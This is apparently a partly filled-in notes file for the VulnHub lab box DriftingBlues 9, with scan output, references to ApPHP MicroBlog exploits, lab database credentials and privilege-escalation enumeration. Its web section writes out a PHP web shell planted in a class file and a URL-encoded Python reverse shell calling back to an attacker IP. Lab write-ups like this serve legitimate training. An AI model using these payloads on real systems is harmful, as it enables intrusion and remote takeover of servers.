# BOX NAME: DriftingBlues 9
**LINK**: https://www.vulnhub.com/entry/driftingblues-9-final,695/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. 
2. 
3. 
4. 
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.55
[+] URL:	http://driftingblues.box
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-db9.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 15:02 CEST
Nmap scan report for test.driftingblues.box (10.77.0.55)
Host is up (0.00028s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-generator: ApPHP MicroBlog vCURRENT_VERSION
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: ApPHP MicroBlog
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36103/tcp   status
|   100024  1          40052/tcp6  status
|   100024  1          56976/udp   status
|_  100024  1          59556/udp6  status

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.48 seconds
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan

```
└─$ whatweb $URL --log-verbose=whatweb-db9.log 
http://driftingblues.box [200 OK] Apache[2.4.10], Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[admin@domain.com], HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], IP[10.77.0.55], Meta-Author[ApPHP Company - Advanced Power of PHP], MetaGenerator[ApPHP MicroBlog vCURRENT_VERSION], Script[text/javascript], Title[ApPHP MicroBlog]
```

nikto-scan

```
└─$ nikto -h $IP | tee nikto-db9.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.55
+ Target Hostname:    10.77.0.55
+ Target Port:        80
+ Start Time:         2023-04-27 15:02:28 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017                                                                                                                                 
+ /backup/: Directory indexing found.
+ /backup/: This might be interesting.           
+ /images/: Directory indexing found.
+ /docs/: Directory indexing found.
+ /styles/: Directory indexing found.            
+ /INSTALL.txt: Default file found.            
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /admin/home.php: Admin login page/section found.
+ 8103 requests: 0 error(s) and 16 item(s) reported on remote host                                                                
+ End Time:           2023-04-27 15:03:01 (GMT2) (33 seconds)                                                                     
---------------------------------------------------------------------------                                                       
+ 1 host(s) tested
```

fuzzing

```
page was created by ApPHP Microblog v1.0.1. Seems to be vulnerable to a lot of things.
ApPHP MicroBlog 1.0.1 - Multiple Vulnerabilities                                  | php/webapps/33030.txt
ApPHP MicroBlog 1.0.1 - Remote Command Execution                                  | php/webapps/33070.py

We have RCE in the native web handler.. wow.
http://driftingblues.box/index.php?jiko);system((dir)=/ 
Reverse shell anyone?
http://driftingblues.box/index.php?jiko);system((which python)=/ 
A hacking attempt has been detected. For security reasons, we're blocking any code execution.

Oh, that backfired..Well it seems someone has been tampering with the webserver a bit. It seems to be some added code that filters anythong not "dir"
Oh well. The python script worked real-easy.

                        // DATABASE CONNECTION INFORMATION
                        define('DATABASE_HOST', 'localhost');           // Database host
                        define('DATABASE_NAME', 'microblog');           // Name of the database to be used
                        define('DATABASE_USERNAME', 'clapton'); // User name for access to database
                        define('DATABASE_PASSWORD', 'yaraklitepe');     // Password for access to database
                        define('DB_ENCRYPT_KEY', 'p52plaiqb8');         // Database encryption key
                        define('DB_PREFIX', 'mb101_');              // Unique prefix of all table names in the datab
All the directories in the webroot though is owned by root except includes.

drwxr-xr-x 13 root root 4096 May  9  2021 .
drwxr-xr-x  3 root root 4096 May  9  2021 ..
-rw-r--r--  1 root root 1039 May 20  2009 .htaccess
-rw-r--r--  1 root root 1201 Jan 29  2014 INSTALL.txt
-rw-r--r--  1 root root  975 Jan 29  2014 README.txt
drwxr-xr-x  3 root root 4096 May  9  2021 admin
drwxr-xr-x  2 root root 4096 May  9  2021 backup
drwxr-xr-x  2 root root 4096 May  9  2021 docs
-rw-r--r--  1 root root 1191 Jan 29  2014 footer.php
-rw-r--r--  1 root root 1653 Nov 15  2009 header.php
drwxr-xr-x  4 root root 4096 May  9  2021 images
drwxrwxrwx  3 root root 4096 May  9  2021 include
-rw-r--r--  1 root root 6409 Mar 10  2014 index.php
drwxr-xr-x  2 root root 4096 May  9  2021 js
drwxr-xr-x  2 root root 4096 May  9  2021 license
drwxr-xr-x  2 root root 4096 May  9  2021 mails
drwxr-xr-x  2 root root 4096 May  9  2021 page
-rw-r--r--  1 root root 1728 Feb  3  2014 rss.xml
drwxr-xr-x  4 root root 4096 May  9  2021 styles
drwxr-xr-x  8 root root 4096 May  9  2021 wysiwyg

and only "base.inc.php" inside the includes. But its only readable, now writeable.
To get a reverse-shell we need to jump through some hoops. Final payload to get revshell:
1. echo '<?php system($_GET["pwnu"]); ?>' >> include/classes/Accounts.class.php
2. view-source:http://driftingblues.box/include/classes/Accounts.class.php?pwnu2=%2Fusr%2Fbin%2Fpython%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%2210.77.0.35%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C%0A1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27
```
other

```

```

</details>
<details><summary><ins>OTHER</ins></summary>

XXX
```

```

</details>


# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
/home/clapton is tighter as root..
dr-x------  2 clapton clapton 4096 May  9  2021 clapton
```

**SUID's**:

```
www-data@debian:/home$ find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/mount
/bin/umount
/sbin/mount.nfs
/usr/bin/procmail
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/sbin/exim4
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
**SGID's**:

```
www-data@debian:/home$ find / -perm -g=s -type f 2>/dev/null
/sbin/unix_chkpwd
/usr/bin/procmail
/usr/bin/at
/usr/bin/crontab
/usr/bin/wall
/usr/bin/mutt_dotlock
/usr/bin/ssh-agent
/usr/bin/dotlockfile
/usr/bin/expiry
/usr/bin/chage
/usr/bin/lockfile
/usr/bin/bsd-write
/usr/bin/mlocate
```
**OTHERS**:

```
No password reuse. No exciting files.
Nope, take that back. Must've misspelled.
Password 
```
</details>

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*

```
/bin/bash: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6cc31e8bef14758d7715fbeb7f97ad357255909b, stripped
 

No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 8.11 (jessie)
Release:        8.11
Codename:       jessie


Linux debian 3.16.0-4-586 #1 Debian 3.16.51-2 (2017-12-03) i686 GNU/Linux
```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password


DB: 	microblog
USER: 	clapton
PW:		yaraklitepe
ENC:	p52plaiqb8

```
</details>	

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# Proofs

<details><summary><ins>Proofs</ins></summary>

Final payload:
```

```

</details>